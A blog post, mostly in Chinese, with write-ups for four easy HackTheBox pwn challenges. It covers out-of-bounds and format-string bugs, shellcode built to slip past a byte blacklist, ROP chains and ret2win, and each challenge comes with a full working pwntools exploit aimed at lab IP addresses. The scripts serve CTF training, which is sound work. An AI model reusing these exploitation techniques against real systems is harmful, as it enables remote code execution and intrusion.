---
title: "Write-ups: HackTheBox"
published: 2025-07-24
updated: 2025-07-31
description: "Write-ups for HackTheBox's pwn challenges."
image: "https://jsd.cdn.zzko.cn/gh/CuB3y0nd/picx-images-hosting@master/.2rvfoyyezu.avif"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# r0bob1rd

## Difficulty

- EASY

## Description

> I am developing a brand new game with robotic birds. Would you like to test my progress so far?

## Write-up

```c del={11-14, 18, 23}
unsigned __int64 operation()
{
  unsigned int v1; // [rsp+Ch] [rbp-74h] BYREF
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("\nSelect a R0bob1rd > ");
  fflush(stdout);
  __isoc99_scanf("%d", &v1);
  if ( v1 > 9 )
    printf("\nYou've chosen: %s", (const char *)&(&robobirdNames)[v1]);
  else
    printf("\nYou've chosen: %s", (&robobirdNames)[v1]);
  getchar();
  puts("\n\nEnter bird's little description");
  printf("> ");
  fgets(s, 106, stdin);
  puts("Crafting..");
  usleep(0x1E8480u);
  start_screen();
  puts("[Description]");
  printf(s);
  return __readfsqword(0x28u) ^ v3;
}
```

观察到 `operation` 函数存在几个漏洞：

- `if ( v1 > 9 )` 没有对 `v1` 做边界检查，OOB
- `fgets(s, 106, stdin);` BOF
- `printf(s);` 格式化字符串

先看看 `robobirdNames` 附近有什么东西：

```asm showLineNumbers=false ins={12-17}
pwndbg> x/a &robobirdNames
0x6020a0 <robobirdNames>: 0x400ce8
pwndbg> x/50gx 0x6020a0-0x100
0x601fa0: 0x0000000000000000 0x0000000000000000
0x601fb0: 0x0000000000000000 0x0000000000000000
0x601fc0: 0x0000000000000000 0x0000000000000000
0x601fd0: 0x0000000000000000 0x0000000000000000
0x601fe0: 0x0000000000000000 0x0000000000000000
0x601ff0: 0x00007ffff7c58f90 0x0000000000000000
0x602000: 0x0000000000601e10 0x00007ffff7e29190
0x602010: 0x00007ffff7c15df0 0x0000000000400766
0x602020 <puts@got.plt>: 0x00007ffff7cb9420 0x0000000000400786
0x602030 <printf@got.plt>: 0x00007ffff7c96c90 0x00007ffff7d17d90
0x602040 <fgets@got.plt>: 0x00000000004007b6 0x00000000004007c6
0x602050 <signal@got.plt>: 0x00007ffff7c77f00 0x00007ffff7cb7340
0x602060 <setvbuf@got.plt>: 0x00007ffff7cb9ce0 0x00007ffff7c980b0
0x602070 <usleep@got.plt>: 0x0000000000400816 0x0000000000000000
0x602080: 0x0000000000000000 0x0000000000000000
0x602090: 0x0000000000000000 0x0000000000000000
0x6020a0 <robobirdNames>: 0x0000000000400ce8 0x0000000000400cf2
0x6020b0 <robobirdNames+16>: 0x0000000000400cff 0x0000000000400d0c
0x6020c0 <robobirdNames+32>: 0x0000000000400d18 0x0000000000400d26
0x6020d0 <robobirdNames+48>: 0x0000000000400d30 0x0000000000400d40
0x6020e0 <robobirdNames+64>: 0x0000000000400d4b 0x0000000000400d5b
0x6020f0: 0x0000000000000000 0x0000000000000000
0x602100 <stdout@@GLIBC_2.2.5>: 0x00007ffff7e226a0 0x0000000000000000
0x602110 <stdin@@GLIBC_2.2.5>: 0x00007ffff7e21980 0x0000000000000000
0x602120 <stderr@@GLIBC_2.2.5>: 0x00007ffff7e225c0 0x0000000000000000
```

注意到这个地址下方不远处就是 `got` 表，因此我们可以通过输入负索引来泄漏它，然后算出 `libc` 基址。

所以最后思路应该是泄漏 `setvbuf`，计算出 one_gadget 的地址，再利用格式化字符串漏洞篡改 `__stack_chk_fail` 为 one_gadget 地址。而为了触发 `__stack_chk_fail`，我们需要利用 `fgets` 的 BOF 来破坏 canary.

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    ELF,
    args,
    context,
    fmtstr_payload,
    process,
    raw_input,
    remote,
    u64,
)

FILE = "./r0bob1rd"
HOST, PORT = "94.237.122.117", 56995

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
libc = ELF("./glibc/libc.so.6")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    target.sendlineafter(b"> ", str(-8))
    target.recvuntil(b": ")

    setvbuf = u64(target.recvline().strip().ljust(0x8, b"\x00"))
    libc.address = setvbuf - libc.sym["setvbuf"]
    one_gadget = libc.address + 0xE3B01

    fmtstr = fmtstr_payload(
        8, {elf.got["__stack_chk_fail"]: one_gadget}, write_size="short"
    )
    # raw_input("DEBUG")
    target.sendlineafter(b"> ", fmtstr.ljust(106, b"\x00"))

    target.interactive()


if __name__ == "__main__":
    main()
```

# Execute

## Difficulty

- EASY

## Description

> Can you feed the hungry code?

## Write-up

保护全开，但是栈可执行。

```c del={43} ins={16-25, 38-41}
// gcc execute.c -z execstack -o execute

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void setup() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(0x7f);
}

int check(char *blacklist, char *buf, int read_size, int blacklist_size) {
  for (int i = 0; i < blacklist_size; i++) {
    for (int j = 0; j < read_size - 1; j++) {
      if (blacklist[i] == buf[j])
        return 0;
    }
  }

  return 1337;
}

int main() {
  char buf[62];
  char blacklist[] =
      "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

  setup();

  puts("Hey, just because I am hungry doesn't mean I'll execute everything");

  int size = read(0, buf, 60);

  if (!check(blacklist, buf, size, strlen(blacklist))) {
    puts("Hehe, told you... won't accept everything");
    exit(1337);
  }

  ((void (*)())buf)();
}
```

程序对我们的输入做了一个检查，禁用了一些字节，除此以外没有太多限制。所以思路还是打 shellcode.

关于 mask 的爆破，利用了 `a ^ b ^ b = a` 的性质。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    asm,
    context,
    disasm,
    log,
    p64,
    process,
    raw_input,
    remote,
    u64,
)

FILE = "./execute"
HOST, PORT = "94.237.54.192", 31583

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    blacklist = set(b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67")
    mask = b""
    target_string = u64(b"/bin/sh".ljust(0x8, b"\x00"))

    for byte in range(0, 0x100):
        mask = int(f"{byte:02x}" * 8, 16)
        encoded = p64(mask ^ target_string)

        if all(byte not in blacklist for byte in encoded):
            log.success(f"Found mask: {hex(mask)}")
            break

    payload = asm(f"""
        mov rax, {mask}
        push rax
        mov rax, {mask} ^ {target_string}
        xor [rsp], rax
        mov rdi, rsp
        push 0
        pop rsi
        push 0
        pop rdx
        mov rbx, 0x3a
        inc rbx
        mov rax, rbx
        syscall
    """)

    log.success(disasm(payload))

    for byte in payload:
        if byte in blacklist:
            log.warn(f"Bad byte: {byte:2x}")

    # raw_input("DEBUG")
    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

# Restaurant

## Difficulty

- EASY

## Description

> Welcome to our Restaurant. Here, you can eat and drink as much as you want! Just don't overdo it..

## Write-up

只提供了 libc，为了 patchelf 还得去找对应 `ld`：

```bash collapse={4-27} ins={30}
λ ~/Projects/pwn/Restaurant/ strings libc.so.6 | grep "GLIBC"
GLIBC_2.2.5
GLIBC_2.2.6
GLIBC_2.3
GLIBC_2.3.2
GLIBC_2.3.3
GLIBC_2.3.4
GLIBC_2.4
GLIBC_2.5
GLIBC_2.6
GLIBC_2.7
GLIBC_2.8
GLIBC_2.9
GLIBC_2.10
GLIBC_2.11
GLIBC_2.12
GLIBC_2.13
GLIBC_2.14
GLIBC_2.15
GLIBC_2.16
GLIBC_2.17
GLIBC_2.18
GLIBC_2.22
GLIBC_2.23
GLIBC_2.24
GLIBC_2.25
GLIBC_2.26
GLIBC_2.27
GLIBC_PRIVATE
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
```

可以看到使用的是 `GLIBC 2.27`，通过 `glibc-all-in-one` 下载 release 版本的 GLIBC，得到对应 `ld`.

使用以下命令来 patchelf，`--set-rpath .` 是让它在当前目录下自己找 `libc.so.6`，我们只要通过 `--set-interpreter` 设置好动态连接器就行了。

```bash
sudo patchelf --set-interpreter "$(pwd)/ld-2.27.so" --set-rpath . ./restaurant
```

这个程序本身没什么复杂的，注意到只有 `fill` 函数里面的一个 `read` 存在 BOF，用它构造 ROP Chain 就好了。先泄漏 libc，然后再返回到 `fill` 二次输入。

## Exploit

```python
#!/usr/bin/env python3

from pwn import ELF, ROP, args, context, flat, process, raw_input, remote, u64

FILE = "./restaurant"
HOST, PORT = "94.237.60.55", 54861

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary
rop = ROP(elf)
libc = ELF("./libc.so.6")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    # raw_input("DEBUG")
    target.sendlineafter(b"> ", str(1))

    payload = flat(
        b"A" * 0x28, rop.rdi.address, elf.got["puts"], elf.plt["puts"], elf.sym["fill"]
    )
    target.sendafter(b"> ", payload)

    target.recvuntil(b"\xa3\x10\x40")
    libc.address = u64(target.recv(0x6).strip().ljust(8, b"\x00")) - libc.sym["puts"]
    one_gadget = libc.address + 0x10A41C

    payload = flat(b"A" * 0x28, one_gadget)
    target.sendafter(b"> ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```

# You know 0xDiablos

## Difficulty

- EASY

## Description

> I missed my flag

## Write-up

BOF，后门函数 `flag`，检测两个参数。32-bit 栈传参，没啥好说的，不过 python 整数是无限精度的，给它 -1 它就认为这是数学上的 -1，所以我们必须通过把数字截断为 32-bit 补码的形式来模拟 C 在内存中的数据表示。

## Exploit

```python
#!/usr/bin/env python3

from pwn import (
    args,
    context,
    fit,
    process,
    raw_input,
    remote,
)

FILE = "./vuln"
HOST, PORT = "94.237.57.115", 42156

context(log_level="debug", binary=FILE, terminal="kitty")

elf = context.binary


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)
    return target


def main():
    target = launch()

    payload = fit(
        {
            0xBC: elf.sym["flag"],
            0xC0: elf.sym["exit"],
            0xC4: -559038737 & 0xFFFFFFFF,
            0xC8: -1059139571 & 0xFFFFFFFF,
        }
    )
    # raw_input("DEBUG")
    target.sendlineafter(b": ", payload)

    target.interactive()


if __name__ == "__main__":
    main()
```
